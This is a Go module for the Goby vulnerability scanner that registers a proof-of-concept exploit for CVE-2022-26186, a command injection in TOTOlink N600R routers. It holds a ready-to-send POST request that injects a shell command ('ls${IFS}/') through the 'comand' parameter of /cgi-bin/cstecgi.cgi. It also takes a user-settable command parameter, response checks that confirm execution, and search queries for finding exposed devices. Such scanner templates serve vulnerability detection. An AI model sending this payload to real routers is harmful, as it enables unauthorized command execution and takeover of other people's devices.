package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "TOTOlink N600R exportOvpn interface /cgi-bin/cstecgi.cgi file comand parameter command execution vulnerability (CVE-2022-26186)",
    "Description": "<p>TOTOlink N600R is a dual-band wireless router produced by TOTOlink. The router supports the IEEE 802.11n standard, provides two frequency bands of 2.4GHz and 5GHz, and can provide high-speed and stable wireless network connections for multiple devices at the same time.</p><p>Attackers can use this vulnerability to execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "TOTOLINK-N600RD",
    "Homepage": "https://www.totolink.cn/",
    "DisclosureDate": "2022-02-21",
    "PostTime": "2023-08-04",
    "Author": "chuyusec@gmail.com",
    "FofaQuery": "title=\"TOTOLINK\" || body=\"<script>function getUserBrowser(){var e=navigator.userAgent\"",
    "GobyQuery": "title=\"TOTOLINK\" || body=\"<script>function getUserBrowser(){var e=navigator.userAgent\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.totolink.cn/\">https://www.totolink.cn/</a></p>",
    "References": [
        "https://doudoudedi.github.io/2022/02/21/TOTOLINK-N600R-Command-Injection/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ls${IFS}/",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;ls${IFS}/;&filetype=gz",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "aaaaa"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "can not open config file",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;ls${IFS}/;&filetype=gz",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "aaaaa"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "can not open config file",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bin",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2022-26186"
    ],
    "CNNVD": [
        "CNNVD-202203-2018"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "TOTOlink N600R exportOvpn 接口 /cgi-bin/cstecgi.cgi 文件 comand 参数命令执行漏洞（CVE-2022-26186）",
            "Product": "TOTOLINK-N600RD",
            "Description": "<p>TOTOlink N600R是一款双频无线路由器，由TOTOlink公司生产。该路由器支持IEEE 802.11n标准，提供2.4GHz和5GHz两个频段，可同时为多个设备提供高速稳定的无线网络连接。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.totolink.cn/\" target=\"_blank\">https://www.totolink.cn/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "TOTOlink N600R exportOvpn interface /cgi-bin/cstecgi.cgi file comand parameter command execution vulnerability (CVE-2022-26186)",
            "Product": "TOTOLINK-N600RD",
            "Description": "<p>TOTOlink N600R is a dual-band wireless router produced by TOTOlink. The router supports the IEEE 802.11n standard, provides two frequency bands of 2.4GHz and 5GHz, and can provide high-speed and stable wireless network connections for multiple devices at the same time.</p><p>Attackers can use this vulnerability to execute code arbitrarily on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.totolink.cn/\" target=\"_blank\">https://www.totolink.cn/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10358"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}